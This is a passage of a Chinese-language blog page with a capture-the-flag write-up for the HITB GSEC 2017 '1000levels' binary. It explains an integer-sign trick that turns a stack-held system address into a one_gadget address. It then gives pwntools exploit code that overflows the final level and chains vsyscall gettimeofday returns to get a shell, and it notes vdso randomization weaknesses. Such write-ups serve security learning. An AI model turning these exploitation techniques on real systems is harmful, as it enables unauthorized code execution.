</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/HITB%20GSEC%20CTF%202017-1000levels/">HITB GSEC CTF 2017-1000levels</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.与之前BCTF 2017-100levels一模一样，只不过最大值变成了1000关，所以这里也同样可以用爆破来做，但是可以用另一种方法，vsyscall。</p>
<p>2.进入IDA可以看到有一个hint函数，而且里面有system函数，但是很奇怪：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">sprintf((char *)&amp;v1, &quot;Hint: %p\n&quot;, &amp;system, &amp;system);</span><br></pre></td></tr></table></div></figure>

<p>这个代码没怎么看懂，还是看下汇编代码：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191531418.jpeg" alt="img"></p>
<p>这里就是将system的地址赋值给rax，然后rax给栈上的[rbp+var_110]赋值。之后也没有什么其它的更改栈上[rbp+var_110]的操作，所以进入hint函数之后，一定会将system函数放到栈上，通过调试也可以看出来。</p>
<p>3.之后进入go函数，发现如果第一次输入负数，原本将关卡数赋值给[rbp+var_110]的操作就不会被执行，那么[rbp+var_110]上保存的仍然是system函数的地址。之后再输入关卡数，直接加到[rbp+var_110]上，那么如果第一次输入负数，第二次输入system函数和one_gadget的偏移，那么就变相将[rbp+var_110]上存放的内容保存为one_gadget的地址。</p>
<p>▲这里需要注意的是，[rbp+var_110]是在hint函数中被赋值的，而go函数中用到的也是[rbp+var_110]这个变量，但是不同函数栈肯定是不同的，所以这里两个[rbp+var_110]是不是一样的就值得思考一下。看程序可以发现，hint函数和go函数都是在main函数中调用的，那么如果调用的时候两处的rsp是一样的就可以保证两个函数的rbp一样，也就代码[rbp+var_110]也是一样的。查看汇编代码：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191531579.jpeg" alt="img"></p>
<p>可以看到从读取选项数据之后，到判断语句一直没有push,pop之类的操作，也就是说程序无论是运行到hint函数还是go函数时，main函数栈的状态都是一样的，从而导致进入这两个函数中的栈底也都是同一个地址，那么[rbp+var_110]也就一样，所以用hint函数来为[rbp+var_110]赋值成system函数，再用go函数来为[rbp+var_110]赋值为one_gadget这条路是可以的，同样可以调试来确定一下。</p>
<p>4.那么赋值之后进入level关卡函数，由于递归关系，最后一关的栈是和go函数的栈连在一起的，所以可以通过最后一关的栈溢出抵达go函数的栈，从而抵达[rbp+var_110]这个地址处。</p>
<p>5.但是栈溢出只能修改数据，就算控制eip，但是也并不知道[rbp+var_110]处的真实地址，只能通过调试来知道偏移是多少。所以这里需要用的vsyscall来将rsp下挪到[rbp+var_110]处从而执行vsyscall的ret操作来执行[rbp+var_110]处的代码，也就是one_gadget。</p>
<p>6.这里看一下vsyscall处的数据：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191531595.png" alt="img"></p>
<p>▲vsyscall的特点：</p>
<p>(1)某些版本存在，需要用到gdb来查看，IDA中默认不可见。</p>
<p>(2)地址不受到ASLR和PIE的影响，固定是0xffffffffff600000-0xffffffffff601000。</p>
<p>(3)不能从中间进入，只能从函数开头进入，意味着不能直接调用里面的syscall。这里vsyscall分为三个函数，从上到下依次是</p>
<p>A.gettimeofday: 0xffffffffff600000</p>
<p>B.time: 0xffffffffff600400</p>
<p>C.getcpu: 0xffffffffff600800</p>
<p>(4)gettimeofday函数执行成功时返回值就是0，保存在rax寄存器中。这就为某些one_gadget创造了条件。</p>
<p>7.观察代码可以发现，三个函数执行成功之后相当于一个ret操作，所以如果我们将gettimeofday放在eip处，那么就相当于放了一个ret操作上去，而ret操作又相当于pop  eip，那么就相当于直接将rsp往下拉了一个单位。如果我们多次调用gettimeofday，那么就可以将rsp下拉多个单位，从而抵达我们想要的地方来执行代码。那么这里就可以将eip改成gettimeofday，然后在之后添加多个gettimeofday来滑到one_gadget来执行代码。</p>
<p>8.所以现在就可以编写exp了</p>
<p>(1)前置内容：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">libc_system_offset = 0x432C0					</span><br><span class="line">#减去system函数离libc开头的偏移</span><br><span class="line">one_gadget_offset = 0x43158				</span><br><span class="line">#加上one gadget rce离libc开头的偏移</span><br><span class="line">vsyscall_gettimeofday = 0xffffffffff600000</span><br><span class="line"></span><br><span class="line">io.recvuntil(&#x27;Choice:&#x27;)</span><br><span class="line">io.sendline(&#x27;2&#x27;) #让system的地址进入栈中</span><br><span class="line">io.recvuntil(&#x27;Choice:&#x27;)</span><br><span class="line">io.sendline(&#x27;1&#x27;) #调用go()</span><br><span class="line">io.recvuntil(&#x27;How many levels?&#x27;)</span><br><span class="line">io.sendline(&#x27;-1&#x27;) #输入的值必须小于0，防止覆盖掉system的地址</span><br><span class="line">io.recvuntil(&#x27;Any more?&#x27;)</span><br><span class="line">io.sendline(str(one_gadget_offset-libc_system_offset))		</span><br><span class="line">#第二次输入关卡的时候输入偏移值，从而通过相加将system的地址变为one gadget rce的地址</span><br></pre></td></tr></table></div></figure>

<p>这里由于相加关系，levels=system_addr + one_gadget_offset - libc_system_offset,肯定超过999，所以关卡数一定是1000关。</p>
<p>(2)开始循环答题，直至到达最后一关执行栈溢出：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">def answer():</span><br><span class="line">    io.recvuntil(&#x27;Question: &#x27;) </span><br><span class="line">    answer = eval(io.recvuntil(&#x27; = &#x27;)[:-3])</span><br><span class="line">    io.recvuntil(&#x27;Answer:&#x27;)</span><br><span class="line">    io.sendline(str(answer))</span><br><span class="line">for i in range(999): #循环答题</span><br><span class="line">    log.info(i)</span><br><span class="line">    answer()</span><br></pre></td></tr></table></div></figure>

<p>(3)最后一关执行栈溢出，利用gettimeofday滑至one_gadegt从而getshell。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">io.recvuntil(&#x27;Question: &#x27;)</span><br><span class="line">io.send(b&#x27;a&#x27;*0x38 + p64(vsyscall_gettimeofday)*3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>

<p>▲以下是测试[rbp+var_110]的数据：</p>
<p>main函数中的rbp:  00007FFD3A854900</p>
<p>hint函数中的rbp:   00007FFD3A8548C0</p>
<p>go函数中的rbp:    00007FFD3A8548C0</p>
<p>▲vsyscall用法:</p>
<p>vsyscall直接进行syscall，并没有利用栈空间，所以在处理栈溢出，但是由于PIE没有别的地址可以用时，而栈上又有某个有用的地址的时候，可以通过vsyscall构造一个rop链来ret，每次ret都会消耗掉一个地址，将rsp下拉一个单位，这样就可以逐渐去贴近想要的那个地址，最后成功ret到相应的位置。</p>
<p>▲vdso的特点：</p>
<p>(1)vdso的地址随机化的，且其中的指令可以任意执行，不需要从入口开始。</p>
<p>(2)相比于栈和其他的ASLR，vdso的随机化非常的弱，对于32的系统来说，有1/256的概率命中。</p>
<p>(3)不同的内核随机程度不同：</p>
<p>A.较旧版本：<code>0xf76d9000</code>-<code>0xf77ce000</code></p>
<p>B.较新版本：<code>0xf7ed0000</code>-<code>0xf7fd0000</code></p>
<p>C.其它版本：</p>
<p>可以编译以下文件之后用脚本查看：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">// compiled: gcc -g -m32 vdso_addr.c -o vdso_addr</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;vdso addr: %124$p\n&quot;);//这里的偏移不同内核不一样，可调试一下看看。</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>查看脚本：</p>
<p>#注释头</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line">for i in range(100):</span><br><span class="line">    result += [os.popen(&#x27;./vdso_addr&#x27;).read()[:-1]]</span><br><span class="line"></span><br><span class="line">result = sorted(result)</span><br><span class="line"></span><br><span class="line">for v in result:</span><br><span class="line">    print (v)</span><br></pre></td></tr></table></div></figure>

<p>▲vdso的用法：与vsystem类似，泄露出地址后相当于有了syscall。另外32位条件下有__kernel_rt_sigreturn，可以打SROP。</p>
<p>参考资料：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5236" >https://xz.aliyun.com/t/5236</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article></section><nav class="paginator"><div class="paginator-inner"><a class="extend prev" rel="prev" href="/page/5/"><i class="fas fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/7/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">108</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">49</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">50</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ Untitled ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', 'Please enter characters');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>